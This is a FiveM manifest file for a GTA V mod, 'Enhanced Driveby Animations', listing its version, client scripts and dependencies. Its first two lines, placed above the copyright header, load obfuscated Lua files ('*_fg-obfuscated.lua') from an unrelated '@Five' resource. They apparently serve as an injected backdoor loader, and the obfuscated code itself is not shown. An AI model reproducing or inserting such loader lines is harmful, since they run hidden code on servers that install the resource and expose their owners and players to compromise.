shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/shared_fg-obfuscated.lua'
--[[ ====================================================================================================================================

	Project: "Enhanced Driveby Animations (EDA)"
	Copyright � 2022 Delta District (deltadistrict.com)

]]-- ====================================================================================================================================

--[[	FXMANIFEST INFO  	]]--

fx_version 'cerulean'
game 'gta5'
version '1.0.0'
lua54 'yes'

--[[	FILES TO LOAD	]]--

client_script 'config.lua'
client_script 'driveby.lua'

escrow_ignore {
  'config.lua',
}

dependency '/assetpacks'